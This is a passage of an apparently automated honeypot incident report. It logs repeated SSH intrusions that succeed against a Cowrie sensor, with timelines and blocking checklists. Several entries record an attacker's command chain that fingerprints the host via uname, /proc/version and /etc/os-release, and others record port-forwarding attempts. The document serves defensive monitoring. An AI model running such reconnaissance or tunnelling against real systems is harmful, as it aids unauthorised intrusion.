| **Last Seen** | 2026-07-24 17:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:55:58` | `cowrie.session.connect` |
| `2026-07-24 17:55:58` | `cowrie.client.version` |
| `2026-07-24 17:55:58` | `cowrie.client.kex` |
| `2026-07-24 17:56:00` | `cowrie.login.success` |
| `2026-07-24 17:56:02` | `cowrie.session.params` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:02` | `cowrie.command.success` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:02` | `cowrie.command.input` |
| `2026-07-24 17:56:03` | `cowrie.log.closed` |
| `2026-07-24 17:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-684eb034a371

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:57 |
| **Last Seen** | 2026-07-24 17:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:57:14` | `cowrie.session.connect` |
| `2026-07-24 17:57:15` | `cowrie.client.version` |
| `2026-07-24 17:57:15` | `cowrie.client.kex` |
| `2026-07-24 17:57:17` | `cowrie.login.success` |
| `2026-07-24 17:57:19` | `cowrie.session.params` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:19` | `cowrie.command.success` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:19` | `cowrie.command.input` |
| `2026-07-24 17:57:20` | `cowrie.log.closed` |
| `2026-07-24 17:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceae229a6c2c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:58 |
| **Last Seen** | 2026-07-24 17:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:58:31` | `cowrie.session.connect` |
| `2026-07-24 17:58:32` | `cowrie.client.version` |
| `2026-07-24 17:58:32` | `cowrie.client.kex` |
| `2026-07-24 17:58:34` | `cowrie.login.success` |
| `2026-07-24 17:58:36` | `cowrie.session.params` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:36` | `cowrie.command.success` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:36` | `cowrie.command.input` |
| `2026-07-24 17:58:37` | `cowrie.log.closed` |
| `2026-07-24 17:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39e71acd86f0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:59 |
| **Last Seen** | 2026-07-24 17:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:59:48` | `cowrie.session.connect` |
| `2026-07-24 17:59:49` | `cowrie.client.version` |
| `2026-07-24 17:59:49` | `cowrie.client.kex` |
| `2026-07-24 17:59:51` | `cowrie.login.success` |
| `2026-07-24 17:59:53` | `cowrie.session.params` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:53` | `cowrie.command.success` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:53` | `cowrie.command.input` |
| `2026-07-24 17:59:54` | `cowrie.log.closed` |
| `2026-07-24 17:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53bcff98c0e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:01 |
| **Last Seen** | 2026-07-24 18:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:01:06` | `cowrie.session.connect` |
| `2026-07-24 18:01:07` | `cowrie.client.version` |
| `2026-07-24 18:01:07` | `cowrie.client.kex` |
| `2026-07-24 18:01:09` | `cowrie.login.success` |
| `2026-07-24 18:01:11` | `cowrie.session.params` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:11` | `cowrie.command.success` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:11` | `cowrie.command.input` |
| `2026-07-24 18:01:12` | `cowrie.log.closed` |
| `2026-07-24 18:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2138f2c9abf2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:02 |
| **Last Seen** | 2026-07-24 18:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:02:23` | `cowrie.session.connect` |
| `2026-07-24 18:02:23` | `cowrie.client.version` |
| `2026-07-24 18:02:23` | `cowrie.client.kex` |
| `2026-07-24 18:02:25` | `cowrie.login.success` |
| `2026-07-24 18:02:27` | `cowrie.session.params` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:27` | `cowrie.command.success` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:27` | `cowrie.command.input` |
| `2026-07-24 18:02:28` | `cowrie.log.closed` |
| `2026-07-24 18:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c9bce94676c

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-07-24 18:02 |
| **Last Seen** | 2026-07-24 18:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:02:34` | `cowrie.session.connect` |
| `2026-07-24 18:02:35` | `cowrie.client.version` |
| `2026-07-24 18:02:35` | `cowrie.client.kex` |
| `2026-07-24 18:02:37` | `cowrie.login.success` |
| `2026-07-24 18:02:37` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cd92f67b1f0

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-24 18:02 |
| **Last Seen** | 2026-07-24 18:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:02:42` | `cowrie.session.connect` |
| `2026-07-24 18:02:43` | `cowrie.client.version` |
| `2026-07-24 18:02:43` | `cowrie.client.kex` |
| `2026-07-24 18:02:45` | `cowrie.login.success` |
| `2026-07-24 18:02:46` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0a7230da2c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:03 |
| **Last Seen** | 2026-07-24 18:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:03:39` | `cowrie.session.connect` |
| `2026-07-24 18:03:39` | `cowrie.client.version` |
| `2026-07-24 18:03:39` | `cowrie.client.kex` |
| `2026-07-24 18:03:42` | `cowrie.login.success` |
| `2026-07-24 18:03:43` | `cowrie.session.params` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:43` | `cowrie.command.success` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:43` | `cowrie.command.input` |
| `2026-07-24 18:03:44` | `cowrie.log.closed` |
| `2026-07-24 18:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f9dbcd4bb40

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:04 |
| **Last Seen** | 2026-07-24 18:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:04:55` | `cowrie.session.connect` |
| `2026-07-24 18:04:55` | `cowrie.client.version` |
| `2026-07-24 18:04:55` | `cowrie.client.kex` |
| `2026-07-24 18:04:58` | `cowrie.login.success` |
| `2026-07-24 18:04:59` | `cowrie.session.params` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:04:59` | `cowrie.command.success` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:04:59` | `cowrie.command.input` |
| `2026-07-24 18:05:00` | `cowrie.log.closed` |
| `2026-07-24 18:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-985269c87816

| Field | Detail |
|---|---|
| **Source IP** | `218.149.228[.]135` |
| **First Seen** | 2026-07-24 18:05 |
| **Last Seen** | 2026-07-24 18:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:05:13` | `cowrie.session.connect` |
| `2026-07-24 18:05:14` | `cowrie.client.version` |
| `2026-07-24 18:05:14` | `cowrie.client.kex` |
| `2026-07-24 18:05:16` | `cowrie.login.success` |
| `2026-07-24 18:05:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.228[.]135` to AbuseIPDB if not already reported
- [ ] Block `218.149.228[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06579ab94bd

| Field | Detail |
|---|---|
| **Source IP** | `179.185.227[.]77` |
| **First Seen** | 2026-07-24 18:05 |
| **Last Seen** | 2026-07-24 18:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:05:26` | `cowrie.session.connect` |
| `2026-07-24 18:05:26` | `cowrie.client.version` |
| `2026-07-24 18:05:26` | `cowrie.client.kex` |
| `2026-07-24 18:05:28` | `cowrie.login.success` |
| `2026-07-24 18:05:28` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.227[.]77` to AbuseIPDB if not already reported
- [ ] Block `179.185.227[.]77` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac9da397a40

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:06 |
| **Last Seen** | 2026-07-24 18:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:06:11` | `cowrie.session.connect` |
| `2026-07-24 18:06:12` | `cowrie.client.version` |
| `2026-07-24 18:06:12` | `cowrie.client.kex` |
| `2026-07-24 18:06:14` | `cowrie.login.success` |
| `2026-07-24 18:06:16` | `cowrie.session.params` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:16` | `cowrie.command.success` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:16` | `cowrie.command.input` |
| `2026-07-24 18:06:17` | `cowrie.log.closed` |
| `2026-07-24 18:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddc9ee2843c5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:07 |
| **Last Seen** | 2026-07-24 18:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:07:27` | `cowrie.session.connect` |
| `2026-07-24 18:07:27` | `cowrie.client.version` |
| `2026-07-24 18:07:27` | `cowrie.client.kex` |
| `2026-07-24 18:07:29` | `cowrie.login.success` |
| `2026-07-24 18:07:31` | `cowrie.session.params` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.command.success` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.command.input` |
| `2026-07-24 18:07:31` | `cowrie.log.closed` |
| `2026-07-24 18:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0136760a0813

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:08 |
| **Last Seen** | 2026-07-24 18:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
